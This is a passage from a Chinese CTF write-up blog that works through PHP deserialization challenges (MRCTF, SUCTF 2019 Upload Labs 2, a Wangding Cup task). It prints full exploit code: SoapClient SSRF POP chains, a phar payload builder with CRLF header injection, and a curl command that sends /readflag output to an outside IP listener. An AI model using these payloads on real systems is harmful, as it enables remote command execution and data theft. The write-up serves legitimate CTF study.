class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag=<span class="string">"MRCTF&#123;this_is_a_fake_flag&#125;"</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">'hello'</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">'world'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要反序列化就一定会触发__wakeup()魔术方法，这里实例化了Typecho_Db类，跟进一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($adapterName, $prefix = <span class="string">'typecho_'</span>)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">     <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/** 数据库适配器 */</span></span><br><span class="line">     $adapterName = <span class="string">'Typecho_Db_Adapter_'</span> . $adapterName;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">'isAvailable'</span>))) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">"Adapter &#123;$adapterName&#125; is not available"</span>);<span class="comment">//__toString()</span></span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>这里将$adapterName进行了拼接，这就会触发某个类的__toString()魔术方法，找一下toString()魔术方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'action'</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> Typecho_Db::SELECT:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">        <span class="keyword">case</span> Typecho_Db::INSERT:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'INSERT INTO '</span></span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">            . <span class="string">'('</span> . implode(<span class="string">' , '</span>, array_keys(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) . <span class="string">')'</span></span><br><span class="line">            . <span class="string">' VALUES '</span></span><br><span class="line">            . <span class="string">'('</span> . implode(<span class="string">' , '</span>, array_values(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) . <span class="string">')'</span></span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'limit'</span>];</span><br><span class="line">        <span class="keyword">case</span> Typecho_Db::DELETE:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'DELETE FROM '</span></span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'where'</span>];</span><br><span class="line">        <span class="keyword">case</span> Typecho_Db::UPDATE:</span><br><span class="line">            $columns = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) &#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>] <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                    $columns[] = <span class="string">"$key = $val"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">'UPDATE '</span></span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">            . <span class="string">' SET '</span> . implode(<span class="string">' , '</span>, $columns)</span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'where'</span>];</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$this-&gt;_sqlPreBuild[‘action’]的值是select的话，会返回$this-&gt;$_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild)，如果把$_adapter实例化为SoapClient类，调用的parseSelect方法不存在，就会调用__call魔术方法，再通过__call魔术方法来实现SSRF</p><p>POP链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HelloWorld_DB::wakeup--&gt;</span><br><span class="line">Typecho_Db::__construct(tostring)--&gt;</span><br><span class="line">Typecho_Db_Query::__construct--&gt;</span><br><span class="line">(this-&gt;_adapter&#x3D;new Soapclient)--&gt;</span><br><span class="line">ssrf</span><br></pre></td></tr></table></figure><p>后面的知识点来自y1ng师傅的文章，附上出处<a href="https://www.gem-love.com/ctf/2184.html#EzpopRevenge" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2184.html#EzpopRevenge</a></p><p>将字符串改写成十六进制，也就是将表示字符串的s写成大写S，这样private属性后面的<code>%00</code>这个不可见字符就能写成<code>\00</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $target = <span class="string">'http://127.0.0.1/flag.php'</span>;</span><br><span class="line">        $headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">            <span class="string">'Cookie: PHPSESSID=a8vkg6l5j5sesvqan5q5s4obr1'</span></span><br><span class="line">        );</span><br><span class="line">        $b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'HyyMbb^^'</span>.join(<span class="string">'^^'</span>,$headers),<span class="string">'uri'</span>      =&gt; <span class="string">"aaab"</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild =<span class="keyword">array</span>(<span class="string">"action"</span>=&gt;<span class="string">"SELECT"</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence = [<span class="string">"hello"</span> =&gt; <span class="keyword">new</span> Typecho_Db_Query()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> HelloWorld_DB();</span><br><span class="line">$aaa = serialize($a);</span><br></pre></td></tr></table></figure><p>php版本问题，没有弄</p><p>最后就是把生成的payload用post传过去，在get传入admin的值就能拿到flag了</p><h3 id="SUCTF-2019-Upload-Labs-2"><a href="#SUCTF-2019-Upload-Labs-2" class="headerlink" title="[SUCTF 2019]Upload Labs 2"></a>[SUCTF 2019]Upload Labs 2</h3><p>给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#admin.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ad</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $clazz;</span><br><span class="line">    <span class="keyword">public</span> $func1;</span><br><span class="line">    <span class="keyword">public</span> $func2;</span><br><span class="line">    <span class="keyword">public</span> $func3;</span><br><span class="line">    <span class="keyword">public</span> $instance;</span><br><span class="line">    <span class="keyword">public</span> $arg1;</span><br><span class="line">    <span class="keyword">public</span> $arg2;</span><br><span class="line">    <span class="keyword">public</span> $arg3;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = $cmd;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;clazz = $clazz;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func1 = $func1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func2 = $func2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func3 = $func3;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg1 = $arg1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg2 = $arg2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg3 = $arg3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        $reflect = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;clazz);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;instance = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func1);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func2);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg2);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func3);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'admin'</span>]))&#123;</span><br><span class="line">        $cmd = $_POST[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">        $clazz = $_POST[<span class="string">'clazz'</span>];</span><br><span class="line">        $func1 = $_POST[<span class="string">'func1'</span>];</span><br><span class="line">        $func2 = $_POST[<span class="string">'func2'</span>];</span><br><span class="line">        $func3 = $_POST[<span class="string">'func3'</span>];</span><br><span class="line">        $arg1 = $_POST[<span class="string">'arg1'</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">'arg2'</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">'arg3'</span>];</span><br><span class="line">        $admin = <span class="keyword">new</span> Ad($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);</span><br><span class="line">        $admin-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You r not admin!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line">    <span class="keyword">public</span> $type;</span><br><span class="line">    <span class="keyword">public</span> $func = <span class="string">"Check"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $class = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">        $a = $class-&gt;newInstanceArgs(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        $a-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getMIME</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;type = finfo_file($finfo, <span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        finfo_close($finfo);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $data = file_get_contents(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        <span class="keyword">if</span> (mb_strpos($data, <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"&amp;lt;? in contents!"</span>);<span class="comment">//匹配到<span class="meta">&lt;?</span>会报错，这里用js的形式写🐎</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#func.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"url"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i'</span>,$_POST[<span class="string">'url'</span>]))&#123;<span class="comment">//不能出现phar，可以用php的伪协议绕过</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Go away!"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $file_path = $_POST[<span class="string">'url'</span>];</span><br><span class="line">        $file = <span class="keyword">new</span> File($file_path);</span><br><span class="line">        $file-&gt;getMIME();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your file type is '$file' &lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>审计：先来看admin.php，触发点在__destruct()魔术方法，可以执行cmd的命令</p><p>想要实例化Ad类，必须要让$_SERVER[‘REMOTE_ADDR’] == ‘127.0.0.1’成立，这里要用到SSRF来进行服务端的伪造<del>~</del></p><p>class.php中的__wakeup()魔术方法可以建立某个类的反射类，在实例化该类，举个小例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$class = <span class="keyword">new</span> ReflectionClass(<span class="string">'Person'</span>); <span class="comment">// 建立 Person这个类的反射类  </span></span><br><span class="line">$instance  = $class-&gt;newInstanceArgs($args); <span class="comment">// 相当于实例化Person 类</span></span><br></pre></td></tr></table></figure><p>在func.php中，会调用getMIME()函数方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMIME</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;type = finfo_file($finfo, <span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        finfo_close($finfo);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里有篇文章讲了finfo_open()也会触发phar反序列化</p><p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p><p>pop链：上传phar文件-&gt;触发finfo_open()反序列化-&gt;触发__wakeup()-&gt;实例化SoapClient类-&gt;ssrf访问admin.php-&gt;触发__destruct()-&gt;系统命令执行命令调用</p><p>由于对SoapClient类的具体用法和原理不了解，嫖了exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'333.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'333.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">'&lt;script language="php"&gt;__HALT_COMPILER();&lt;/script&gt;'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file_name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $func = <span class="string">"SoapClient"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $target = <span class="string">"http://127.0.0.1/admin.php"</span>;</span><br><span class="line">        $post_string = <span class="string">'admin=1&amp;cmd=curl "http://174.2.54.253:7777"."?`/readflag`"&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3='</span>. <span class="string">"\r\n"</span>;</span><br><span class="line">        $headers = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name  = [</span><br><span class="line">            <span class="keyword">null</span>,</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">                  <span class="string">'user_agent'</span>=&gt; str_replace(<span class="string">'^^'</span>, <span class="string">"\r\n"</span>, <span class="string">'xxxxx^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'Content-Length: '</span>. (string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string),</span><br><span class="line">                  <span class="string">'uri'</span>=&gt;<span class="string">'hello'</span>)</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$object = <span class="keyword">new</span> File;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($object));</span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>上传之后，开一台内网靶机监听7777端口，再php伪协议访问文件上传之后的路径，就会弹回shell</p><img src="/2020/05/30/unserialize/6.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuoj4</title>
      <link href="/2020/05/29/buuoj4/"/>
      <url>/2020/05/29/buuoj4/</url>
      
        <content type="html"><![CDATA[<h3 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h3><a id="more"></a><p>开题，源码处有提示，google，好像是php.ini中的设置不对</p><p>抓包，有发现</p><img src="/2020/05/29/buuoj4/1.png" class=""><p>func=?&amp;p=?,这里前面的应该是填函数，后面是内容，测试一下，果然行的通，读取一下index.php文件吧</p><p>这里用readfile或者file_get_contents,post交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func&#x3D;file_get_contents&amp;p&#x3D;index.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $disable_fun = <span class="keyword">array</span>(<span class="string">"exec"</span>,<span class="string">"shell_exec"</span>,<span class="string">"system"</span>,<span class="string">"passthru"</span>,<span class="string">"proc_open"</span>,<span class="string">"show_source"</span>,<span class="string">"phpinfo"</span>,<span class="string">"popen"</span>,<span class="string">"dl"</span>,<span 